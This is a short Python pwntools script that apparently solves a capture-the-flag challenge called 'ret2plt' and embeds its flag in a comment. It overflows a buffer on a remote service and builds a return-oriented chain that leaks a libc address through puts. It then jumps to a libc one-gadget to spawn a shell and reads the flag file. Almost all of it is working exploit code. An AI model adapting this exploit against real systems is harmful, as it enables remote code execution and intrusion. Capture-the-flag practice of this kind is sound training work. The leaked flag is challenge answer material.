#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

# AIS3{r3t2plt_r3t_to_y0ur_lif3}

e = ELF('ret2plt')
l = ELF('libc.so.6')

context.arch = 'amd64'

host , port = 'pwnhub.tw' , 56026
#host , port = '192.168.78.141' , 4000
y = remote( host , port )

pop_rdi = 0x4006f3

p = 'a' * 0x20
p += 'RBBBBBBP'
p += flat(
    pop_rdi,
    e.got['__libc_start_main'],
    e.plt['puts'],
    0x400636

)

y.sendline( p )
y.recvuntil( 'om !\n' )

__libc_start_main = u64( y.recv( 6 ).ljust( 8 , '\x00' ) )
log.success( '-> {}'.format( hex( __libc_start_main ) ) )

l.address += __libc_start_main - l.symbols['__libc_start_main']

p = 'a' * 0x20
p += 'RBBBBBBP'
p += flat(
    l.address + 0xef6c4,
)

y.sendline( p )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()

